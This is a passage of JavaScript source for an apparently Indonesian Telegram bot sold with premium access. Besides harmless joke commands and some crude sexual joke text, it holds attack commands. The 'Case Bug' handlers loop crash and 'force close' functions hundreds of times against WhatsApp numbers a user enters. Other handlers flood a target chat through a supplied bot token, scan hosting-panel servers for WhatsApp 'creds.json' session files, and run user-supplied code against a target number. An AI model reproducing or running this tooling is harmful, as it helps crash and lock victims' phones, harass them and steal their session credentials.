      caption: `<blockquote>ɪᴘʜᴏɴᴇ ǫᴜᴏᴛᴇᴅ ɢᴇɴᴇʀᴀᴛᴏʀ</blockquote>
      
💬 \`${text}\`
🕒 ${time} | 🔋 ${battery}% | 📡 ${carrier}`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ", url: "https://t.me/fanzdevv" }]
        ]
      }
    });
  } catch (err) {
    console.error(err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memproses gambar.");
  }
});

async function showProgress(chatId, messageId, steps = 10, delay = 500) {
  for (let i = 1; i <= steps; i++) {
    const bar = '▓'.repeat(i) + '░'.repeat(steps - i);
    const text = `⌛ Sedang memproses...\n[${bar}] ${i * 10}%`;

    try {
      await bot.editMessageText(text, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown"
      });
    } catch (err) {
      console.error("❌ Gagal edit:", err.response?.body?.description || err.message);
      break;
    }

    await new Promise(r => setTimeout(r, delay));
  }

  await bot.editMessageText("🌷 Selesai!", {
    chat_id: chatId,
    message_id: messageId
  });
}


bot.onText(/^\/nulis(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  const text = match[1];
  if (!text) {
    return bot.sendMessage(chatId, "Mau nulis apa? Contoh:\n/nulis aku sayang kamu");
  }

  try {
    const progressMessage = await bot.sendMessage(chatId, "⌛ Sedang menulis...\n[░░░░░]");

    await showProgress(chatId, progressMessage.message_id, 5, 400);

    const response = await axios.post(
      "https://lemon-write.vercel.app/api/generate-book",
      {
        text,
        font: "default",
        color: "#000000",
        size: "32",
      },
      {
        responseType: "arraybuffer",
        headers: { "Content-Type": "application/json" },
      }
    );

    await bot.deleteMessage(chatId, progressMessage.message_id);

    await bot.sendPhoto(chatId, Buffer.from(response.data));
  } catch (error) {
    console.error("Nulis error:", error.message);
    bot.sendMessage(chatId, "❌ Error, coba lagi nanti ya.");
  }
});

bot.onText(/^\/Done(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const input = match?.[1];
  if (!input) {
    return bot.sendMessage(
      chatId,
      "📌 *Gunakan format yang benar!*\n\nContoh:\n/Done jasa install panel,15000,Dana",
      { parse_mode: "Markdown" }
    );
  }

  const [namaBarang, hargaBarang, metodeBayar] = input.split(",").map(part => part?.trim());
  if (!namaBarang || !hargaBarang) {
    return bot.sendMessage(
      chatId,
      "❗ Format salah. Minimal harus ada nama barang dan harga.\nContoh:\n/Done jasa install panel,15000,Dana",
      { parse_mode: "Markdown" }
    );
  }

  const hargaFormatted = `Rp${Number(hargaBarang).toLocaleString("id-ID")}`;
  const metodePembayaran = metodeBayar || "Tidak disebutkan";
  const now = new Date().toLocaleString("id-ID", {
    timeZone: "Asia/Jakarta",
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  });

  bot.sendVideo(chatId, "https://b.top4top.io/m_3617is47f1.mp4", {
    caption: ` \`\`\`
✅ Transaksi Selesai\`\`\`
\`\`\`
📦 Barang: ${namaBarang}
💳 Harga: ${hargaFormatted}
💰 Pembayaran: ${metodePembayaran}
⏰ Waktu: ${now}
\`\`\`
`,
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "ᝄ Channels ᝄ", url: "t.me/AboutFanzz" },
          { text: "ᝄ Developers ᝄ", url: "t.me/fanzdevv" }
        ],
      ]
    }
  });
});

bot.onText(/^\/cekkontol(?: (.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(chatId, 'Nama nya mana yang mau di cek kontol nya');
  }

  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  const hasil = `
╭━━━━°「 *Kontol ${text}* 」°
┃
┊• Nama : ${text}
┃• Kontol : ${pickRandom(['ih item','Belang wkwk','Muluss','Putih Mulus','Black Doff','Pink wow','Item Glossy'])}
┊• True : ${pickRandom(['perjaka','ga perjaka','udah pernah dimasukin','masih ori','jumbo'])}
┃• jembut : ${pickRandom(['lebat','ada sedikit','gada jembut','tipis','muluss'])}
┃• ukuran : ${pickRandom(['1cm','2cm','3cm','4cm','5cm','20cm','45cm','50cm','90meter','150meter','5km','gak normal'])}
╰═┅═━––––––๑`;

  bot.sendMessage(chatId, hasil);
});

bot.onText(/^\/cekcantik(?: (.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(chatId, 'Nama nya mana yang mau di cek kecantikan nya 💅');
  }

  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  const hasil = `
╭━━━━°「 *Cek Cantik ${text}* 」°
┃
┊• Nama : ${text}
┊• Tingkat Kecantikan : ${pickRandom([
    '100% Cantik Banget 😍',
    '95% Cantik Natural 💖',
    '80% Manis Banget 😚',
    '60% Lumayan Cantik 😊',
    '40% Cantik Dalam Gelap 😂',
    '10% Butuh Filter Instagram 🤭'
  ])}
┃• Aura : ${pickRandom([
    'Bersinar Kayak Bintang 🌟',
    'Menawan Banget 💫',
    'Biasa Tapi Nyenengin 💐',
    'Misterius dan Elegan 👑',
    'Lembut dan Anggun 🌸'
  ])}
┊• Nilai Tambah : ${pickRandom([
    'Senyumnya bikin leleh 😍',
    'Tatapan matanya adem banget 👁️',
    'Ramah dan manis 🍬',
    'Bikin orang jatuh cinta 💘',
    'Punya vibe princess 👑'
  ])}
╰═┅═━––––––๑`;

  bot.sendMessage(chatId, hasil);
});

bot.onText(/^\/rasukbot (.+)/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1];

  if (!input.includes("|")) {
    return bot.sendMessage(chatId,
      "📩 Format salah!\n\nGunakan format:\n" +
      "<code>/message token|id|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/message 123456:ABCDEF|987654321|Halo bro|5</code>",
      { parse_mode: "HTML" }
    );
  }

  try {
    const [token, targetId, pesan, jumlahStr] = input.split("|").map(x => x.trim());
    const jumlah = parseInt(jumlahStr);

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return bot.sendMessage(chatId,
        "❌ Format salah!\nGunakan: <code>/message token|id|pesan|jumlah</code>",
        { parse_mode: "HTML" }
      );
    }

    await bot.sendMessage(chatId, "🚀 Mengirim pesan...");
    for (let i = 1; i <= jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    bot.sendMessage(chatId, `✅ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`, {
      parse_mode: "HTML"
    });

  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal mengirim pesan:\n<code>${err.message}</code>`, {
      parse_mode: "HTML"
    });
  }
});

bot.onText(/^\/cekganteng(?: (.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(chatId, 'Nama nya mana yang mau di cek kegantengan nya 😎');
  }

  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  const hasil = `
╭━━━━°「 *Cek Ganteng ${text}* 」°
┃
┊• Nama : ${text}
┊• Tingkat Kegantengan : ${pickRandom([
    '100% Ganteng Parah 😎',
    '90% Ganteng Natural 😁',
    '75% Lumayan Ganteng 😌',
    '50% Standar Pasar Minggu 😅',
    '25% Masih Proses Pubertas 😂',
    '0% Gagal Upgrade 😭'
  ])}
┃• Aura : ${pickRandom([
    'Bersinar Terang ✨',
    'Biasa Aja 😶',
    'Kayak Lampu Redup 💡',
    'Misterius 😏',
    'Menyilaukan 🔥'
  ])}
┊• Nilai Tambah : ${pickRandom([
    'Punya senyum manis 😁',
    'Tatapan mematikan 😎',
    'Berwibawa banget 🧠',
    'Lucu dan menggemaskan 🐣',
    'Mirip artis katanya 🎬'
  ])}
╰═┅═━––––––๑`;

  bot.sendMessage(chatId, hasil);
});

const quotes = [
" Jangan menyerah, setiap hari adalah kesempatan baru!",
" Kesuksesan dimulai dari langkah kecil.",
" Fokus pada apa yang bisa kamu kontrol.",
" Kebahagiaan dimulai dari diri sendiri.",
" Terus belajar, terus berkembang!"
];

bot.onText(/^\/quote$/, (msg) => {
  const randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
  const chatId = msg.chat.id;
  bot.sendMessage(msg.chat.id, randomQuote);
});

bot.onText(/^\/cari (.+)/i, async (msg, match) => {
  const chatId = msg.chat.id
  const senderId = msg.from.id
  const query = match[1]?.trim()
  const randomImage = getRandomImage()

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Fitur
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/fanzdevv" }]
      ]
    }
  });
}

  if (!query) return bot.sendMessage(chatId, "```⸙ ZORO — ERROR\n✘ Kasih keyword```", { parse_mode: "Markdown" })

  const loadingMsg = await bot.sendMessage(chatId, "```⸙ ZORO — SEARCH\n✘ Sedang mencari...```", { parse_mode: "Markdown" })
  try {
    const url = "https://restapi-v2.simplebot.my.id/search/gimage?q=" + encodeURIComponent(query)
    const res = await axios.get(url, { timeout: 20000 })

    let images = []
    if (Array.isArray(res?.data?.result)) {
      for (let x of res.data.result) {
        try {
          const u = x.url
          if (!u || typeof u !== "string") continue
          
          if (!/^https?:\/\/.+\.(jpg|jpeg|png|gif|webp)(\?.*)?$/i.test(u)) continue
         
          const head = await axios.head(u, { timeout: 5000 }).catch(() => null)
          if (head && /^image\//i.test(head.headers["content-type"] || "")) {
            images.push(u)
          }
        } catch {}
      }
    }

    if (!images.length) throw new Error("⦸ Gambar tidak ditemukan")

    const maxSend = 12
    for (let img of images.slice(0, maxSend)) {
      await bot.sendPhoto(chatId, img, { caption: `⸙ ZORO — RESULT\n✘ ${query}` })
    }
    await bot.sendMessage(chatId, "```⸙ ZORO — FINAL\n✘ Semua hasil sudah dikirim```", { parse_mode: "Markdown" })
  } catch (err) {
    await bot.sendMessage(chatId, "```⸙ ZORO — ERROR\n✘ " + (err.message || err) + "```", { parse_mode: "Markdown" })
  } finally {
    bot.deleteMessage(chatId, loadingMsg.message_id).catch(()=>{})
  }
})

bot.onText(/^\/brat(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id
  const senderId = msg.from.id
  const randomImage = getRandomImage()
  
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, randomImage, {
    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
( ! ) Silahkan AddPremium Sebelum Menggunakan Fitur
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/fanzdevv" }]
      ]
    }
  });
}
 
  if (!match[1]) {
    return bot.sendMessage(chatId, "```⸙ ZORO — IMAGE\n✘ Format salah!\n\n☬ Cara pakai:\n/brat teks\n\n⎙ Contoh:\n/brat Halo Dunia```", { parse_mode: "Markdown" })
  }
  const text = encodeURIComponent(match[1])
  const loadingMsg = await bot.sendMessage(chatId, "```⸙ 𝗦𝗛𝗔𝗗𝗢𝗪 — 𝙄𝙈𝘼𝙂𝙀\n⎙ Membuat gambar teks...```", { parse_mode: "Markdown" })
  try {
    const url = `https://brat.siputzx.my.id/image?text=${text}&emojiStyle=apple`
    const res = await fetch(url)
    const buffer = Buffer.from(await res.arrayBuffer())
    await bot.sendPhoto(chatId, buffer, { caption: "⸙ ZORO— IMAGE\n⎙ Gambar teks berhasil dibuat.", parse_mode: "Markdown" })
    await bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {})
  } catch {
    bot.sendMessage(chatId, "```⸙ 𝙀𝙍𝙍𝙊𝙍\n✘ Gagal membuat gambar.```", { parse_mode: "Markdown" })
  }
})

bot.onText(/^\/csessions(?:\s(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const domainInput = match[1];

  if (!domainInput) {
    return bot.sendMessage(chatId, "❌ Mohon masukkan domain, PLTA, dan PLTC. Contoh: `/csessions domain.com,PLTA_TOKEN,PLTC_TOKEN`");
  }

  const args = domainInput.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];

  if (!domain || !plta || !pltc) {
    return bot.sendMessage(chatId, "❌ Mohon masukkan domain, PLTA, dan PLTC dengan benar. Contoh: `/csessions domain.com,PLTA_TOKEN,PLTC_TOKEN`");
  }

  await bot.sendMessage(chatId, "⏳ Sedang scan semua server untuk mencari folder `sessions` dan file `creds.json` ...");
  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    return a.type === "dir" || a.type === "directory" || a.mode === "dir" || a.mode === "directory" || a.mode === "d" || a.is_directory === true || a.isDir === true;
  }
 })

bot.onText(/^\/testfunction(?:@[\w_]+)?\s*(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;

  try {
    const args = msg.text.split(" ");
    if (args.length < 3) {
      return bot.sendMessage(chatId, "🪧 Example : /testfunction 62××× 10 (reply function)");
    }

    const q = args[1];
    let jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
    if (isNaN(jumlah) || jumlah <= 0) {
      return bot.sendMessage(chatId, "❌ Jumlah harus angka");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    if (!msg.reply_to_message || !msg.reply_to_message.text) {
      return bot.sendMessage(chatId, "❌ Reply dengan function");
    }

    const processMsg = await bot.sendPhoto(chatId, thumbnailUrlV2, {
      caption:
        `<blockquote><pre>⬡═―—⊱ ⎧ Sanzz – Official ⎭ ⊰―—═⬡</pre></blockquote>
▢  Target: ${q}
▢  Type: Unknown Func
▢  Status: Process Bug
╘═——————————————═⬡`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "! Check", url: `https://wa.me/${q}` }]
        ]
      }
    });

    const processMessageId = processMsg.message_id;

    const safeSock = createSafeSock(sock);
    const funcCode = msg.reply_to_message.text;

    const matchFunc = funcCode.match(/async function\s+(\w+)/);
    if (!matchFunc) return bot.sendMessage(chatId, "❌ Function tidak valid");

    const funcName = matchFunc[1];

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      generateWAMessageFromContent,
      generateForwardMessageContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser
    };

    const vm = require("vm");
    const context = vm.createContext(sandbox);

    const wrapper = `${funcCode}\n${funcName}`;
    const fn = vm.runInContext(wrapper, context);

    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) {
          await fn(target);
        } else if (arity === 2) {
          await fn(safeSock, target);
        } else {
          await fn(safeSock, target, true);
        }
      } catch (e) { }
      await sleep(200);
    }

    const finalText =
      `<blockquote><pre>⬡═―—⊱ ⎧ Reoclint – Official ⎭ ⊰―—═⬡</pre></blockquote>
▢  Target: ${q}
▢  Type: Unknown Func
▢  Status: Success Bug
╘═——————————————═⬡`;

    try {
      await bot.editMessageCaption(finalText, {
        chat_id: chatId,
        message_id: processMessageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "! Check", url: `https://wa.me/${q}` }]
          ]
        }
      });
    } catch (e) {
      await bot.sendPhoto(chatId, thumbnailUrlV2, {
        caption: finalText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "! Check", url: `https://wa.me/${q}` }]
          ]
        }
      });
    }

  } catch (err) {
    console.error(err);
  }
});

//─ ( Case Bug ) 
bot.onText(/\/ZoroInvis(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const randomImage = getRandomImage();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;  
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
  
  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, randomImage, {
      caption: `
╭━━━〔 ACCESS INFORMATION 〕━━━
┃Status : There isn't any Access
┃Reason : Premium Akses
┃Owners: @fanzdevv
╰━━━━━━━━━━━━━━━━━━━━━━━━━
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Contact", url: "https://t.me/fanzdevv" }],
          [
            { text: "Channel", url: "https://t.me/AboutFanzz" }
          ]
        ]
      }
    });
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `
⚠️ *System Warning*  
No active WhatsApp sessions detected.  
Please run /connect to initialize VoltraLink.
    `, { parse_mode: "Markdown" });
  }

  if (!targetNumber) {
    return bot.sendMessage(chatId, `⚠️ *Invalid Input*\n\nUse format: /ZoroInvis 62xxxxxxxxx`, {
      parse_mode: "Markdown"
    });
  }

  const sent = await bot.sendVideo(chatId, randomImage, {
    caption: `
╭─「 INFORMATION BUG ONLINE 」─╮
│ ACTIVE : ${sessions.size}
│ STATUS : INSTALLING TARGET BUG
╰────────────────────────╯
`,
    parse_mode: "Markdown"
  });

  try {
    await new Promise(r => setTimeout(r, 1200));

    await bot.editMessageCaption(`
╭─「 MENUNGGU SIGNAL 」─╮
│SIGNAL : LOADING BUG
│STATUS : SEND TO TARGET
╰───────────────────────╯
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });

    await bot.editMessageCaption(`
╭─「 SUCCESSFULLY SEND 」─╮
│STATUS : SUCCESS INVISBLE
│OWNERS : @fanzdevv
╰───────────────────────╯
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }],
          [{ text: "KEMBALI", callback_data: "back" }]
        ]
      }
    });

    // Jalankan Function
    for (let i = 0; i < 500; i++) {
    await SemestaInvis(sock, target);
    await SemestaInvis(sock, target);
    await SemestaInvis(sock, target);
    await new Promise(resolve => setTimeout(resolve, 1000));
    }

  } catch (err) {
    await bot.sendMessage(chatId, `
╭─「 SYSTEM ERROR 」─╮
│  Execution failed.
│  Details : ${err.message}
╰──────────────────────╯
`, { parse_mode: "Markdown" });
  }
});

bot.onText(/\/ZoroBlank(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const randomImage = getRandomImage();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
  
  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, randomImage, {
      caption: `
╭━━━〔 ACCESS INFORMATION 〕━━━
┃Status : There isn't any Access
┃Reason : Premium Akses
┃Owners: @fanzdevv
╰━━━━━━━━━━━━━━━━━━━━━━━━━
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Contact", url: "https://t.me/fanzdevv" }],
          [
            { text: "Channel", url: "https://t.me/AboutFanzz" }
          ]
        ]
      }
    });
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `
⚠️ *System Warning*  
No active WhatsApp sessions detected.  
Please run /connect to initialize VoltraLink.
    `, { parse_mode: "Markdown" });
  }

  if (!targetNumber) {
    return bot.sendMessage(chatId, `⚠️ *Invalid Input*\n\nUse format: /ZoroBlank 62xxx`, {
      parse_mode: "Markdown"
    });
  }

  const sent = await bot.sendVideo(chatId, randomImage, {
    caption: `
╭─「 INFORMATION BUG ONLINE 」─╮
│ ACTIVE : ${sessions.size}
│ STATUS : INSTALLING TARGET BUG
╰────────────────────────╯
`,
    parse_mode: "Markdown"
  });

  try {
    await new Promise(r => setTimeout(r, 1200));

    await bot.editMessageCaption(`
╭─「 Lock Device WhatsApp 」─╮
│SIGNAL : Blank Device 
│STATUS : SEND TO TARGET
╰───────────────────────╯
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });

    await bot.editMessageCaption(`
╭─「 SUCCESSFULLY SEND 」─╮
│STATUS : SUCCESS Blank Device 
│OWNERS : @fanzdevv
╰─────────────────────╯
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }],
          [{ text: "KEMBALI", callback_data: "back" }]
        ]
      }
    });

    // Jalankan Function
    for (let i = 0; i < 300; i++) {
    await SemestaOneHit(sock, target);
    await SemestaOneHit(sock, target);
    await SemestaOneHit(sock, target);
    await SemestaOneHit(sock, target);
    await SemestaOneHit(sock, target);
    await SemestaOneHit(sock, target);
    await new Promise(resolve => setTimeout(resolve, 1000));
    }

  } catch (err) {
    await bot.sendMessage(chatId, `
╭─「 SYSTEM ERROR 」─╮
│  Execution failed.
│  Details : ${err.message}
╰──────────────────────╯
`, { parse_mode: "Markdown" });
  }
});

bot.onText(/\/ZoroForce(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const randomImage = getRandomImage();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
  
  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, randomImage, {
      caption: `
╭━━━〔 ACCESS INFORMATION 〕━━━
┃Status : There isn't any Access
┃Reason : Premium Akses
┃Owner: @fanzdevv
╰━━━━━━━━━━━━━━━━━━━━━━━━━
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Contact", url: "https://t.me/fanzdevv" }],
          [
            { text: "Channel", url: "https://t.me/AboutFanzz" }
          ]
        ]
      }
    });
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `
⚠️ *System Warning*  
No active WhatsApp sessions detected.  
Please run /connect to initialize VoltraLink.
    `, { parse_mode: "Markdown" });
  }

  if (!targetNumber) {
    return bot.sendMessage(chatId, `⚠️ *Invalid Input*\n\nUse format: /ZoroForce 62xxxxxxxxxx`, {
      parse_mode: "Markdown"
    });
  }

  const sent = await bot.sendVideo(chatId, randomImage, {
    caption: `
╭─「 INFORMATION BUG ONLINE 」─╮
│ ACTIVE : ${sessions.size}
│ STATUS : Loading Force Click 
╰────────────────────────╯
`,
    parse_mode: "Markdown"
  });

  try {
    await new Promise(r => setTimeout(r, 1200));

    await bot.editMessageCaption(`
╭─「 Lock Device WhatsApp 」─╮
│SIGNAL : Force Click 
│STATUS : SEND TO TARGET
╰───────────────────────╯
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });

    await bot.editMessageCaption(`
╭─「 SUCCESSFULLY SEND 」─╮
│STATUS : Force Click 
│OWNERS : @fanzdevv
╰─────────────────────╯
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }],
          [{ text: "KEMBALI", callback_data: "back" }]
        ]
      }
    });

    // Jalankan Function
    for (let i = 0; i < 5; i++) {
    await ForcecloseV2(sock, target);
    await ForcecloseV2(sock, target);
    await ForcecloseV2(sock, target);
    await new Promise(resolve => setTimeout(resolve, 1000));
    }

  } catch (err) {
    await bot.sendMessage(chatId, `
╭─「 SYSTEM ERROR 」─╮
│  Execution failed.
│  Details : ${err.message}
╰──────────────────────╯
`, { parse_mode: "Markdown" });
  }
});

bot.onText(/\/ZoroHard(.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const randomImage = getRandomImage();

  // Parsing parameter
  const args = match[1].split(",");
  const targetNumber = args[0]?.trim();
  const hours = parseFloat(args[1] || "0");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
  const X = Jid;
  
  // Cek premium
  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendVideo(chatId, randomImage, {
      caption: `
╭━━━〔 ACCESS INFORMATION 〕━━━
┃Status : There isn't any Access
┃Reason : Premium Access Only
┃Owners: @fanzdevv
╰━━━━━━━━━━━━━━━━━━━━━━━━━
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Contact", url: "https://t.me/fanzdevv" }],
          [
            { text: "Channel", url: "https://t.me/AboutFanzz" }
          ]
        ]
      }
    });
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `
⚠️ *System Warning*  
No active WhatsApp sessions detected.  
Please run /connect to initialize VoltraLink.
    `, { parse_mode: "Markdown" });
  }

  if (!targetNumber || !hours || hours <= 0) {
    return bot.sendMessage(chatId, `
⚠️ *Invalid Input*  
Format: \`/ZoroHard 62xxxxxxx,3\`  
(3 = durasi dalam jam)
    `, { parse_mode: "Markdown" });
  }

  const sent = await bot.sendVideo(chatId, randomImage, {
    caption: `
╭─「 INFORMATION BUG ONLINE 」─╮
│ ACTIVE : ${sessions.size}
│ STATUS : Loading Delay Target
│ DURATION : ${hours} Jam
╰────────────────────────╯
`,
    parse_mode: "Markdown"
  });

  try {
    const endTime = Date.now() + (hours * 60 * 60 * 1000);
    let attackCount = 0;

    // Jalankan Function
    for (let i = 0; i < 500; i++)
      await SemestaOneHit(sock, target);
      await SemestaOneHit(sock, target);
      await SemestaOneHit(sock, target);
      await SemestaOneHit(sock, target);
      await new Promise(resolve => setTimeout(resolve,1000));

      const remainingMs = endTime - Date.now();
      const remainingH = Math.floor(remainingMs / (1000 * 60 * 60));
      const remainingM = Math.floor((remainingMs % (1000 * 60 * 60)) / (1000 * 60));

      console.log(`Delay Attack #${attackCount} → ${jid} | Sisa ${remainingH}h ${remainingM}m`);

      await new Promise(r => setTimeout(r, 2000)); // delay antar serangan biar awet

    await bot.sendMessage(chatId, `
✅ *Delay Finished*  
Target: ${jid}  
Total Serangan: ${attackCount}  
Durasi: ${hours} jam
    `, { parse_mode: "Markdown" });

  } catch (err) {
    await bot.sendMessage(chatId, `
╭─「 SYSTEM ERROR 」─╮
│  Execution failed.
│  Details : ${err.message}
╰──────────────────────╯
`, { parse_mode: "Markdown" });
  }
});

bot.onText(/\/ZoroDelay(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const randomImage = getRandomImage();
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const cooldown = checkCooldown(userId);
  const target = Jid;
  const mention = Jid;
  const isTarget = Jid;
  
  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `
╭━━━〔 ACCESS INFORMATION 〕━━━
┃Status : There isn't any Access
┃Reason : Premium Akses
┃Owner: @fanzdevv
╰━━━━━━━━━━━━━━━━━━━━━━━━━
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Contact", url: "https://t.me/fanzdevv" }],
          [
            { text: "Channel", url: "https://t.me/AboutFanzz" }
          ]
        ]
      }
    });
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `
⚠️ *System Warning*  
No active WhatsApp sessions detected.  
Please run /connect to initialize VoltraLink.
    `, { parse_mode: "Markdown" });
  }

  if (!targetNumber) {
    return bot.sendMessage(chatId, `⚠️ *Invalid Input*\n\nUse format: /ZoroDelay 62xxxxxxxxxx`, {
      parse_mode: "Markdown"
    });
  }

  const sent = await bot.sendVideo(chatId, randomImage, {
    caption: `
╭─「 INFORMATION BUG ONLINE 」─╮
│ ACTIVE : ${sessions.size}
│ STATUS : Loading Delay Buldozer
╰────────────────────────╯
`,
    parse_mode: "Markdown"
  });

  try {
    await new Promise(r => setTimeout(r, 1200));

    await bot.editMessageCaption(`
╭─「 Lock Device WhatsApp 」─╮
│SIGNAL : Delay Buldozer
│STATUS : SEND TO TARGET
╰───────────────────────╯
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown"
    });

    await bot.editMessageCaption(`
╭─「 SUCCESSFULLY SEND 」─╮
│STATUS : Delay Buldozer
│OWNERS : @fanzdevv
╰─────────────────────╯
`, {
      chat_id: chatId,
      message_id: sent.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "CHECK TARGET", url: `https://wa.me/${formattedNumber}` }],
          [{ text: "KEMBALI", callback_data: "back" }]
        ]
      }
    });

    // Jalankan Function
    for (let i = 0; i < 20; i++) {
    await crashnew(sock, target);
    await crashnew(sock, target);
    await crashnew(sock, target);
    await new Promise(resolve => setTimeout(resolve, 1000));
    }

  } catch (err) {
    await bot.sendMessage(chatId, `
╭─「 SYSTEM ERROR 」─╮
│  Execution failed.
│  Details : ${err.message}
╰──────────────────────╯
`, { parse_mode: "Markdown" });
  }
});

bot.onText(/\/Santoryu(.*)/, async (msg, match) => {
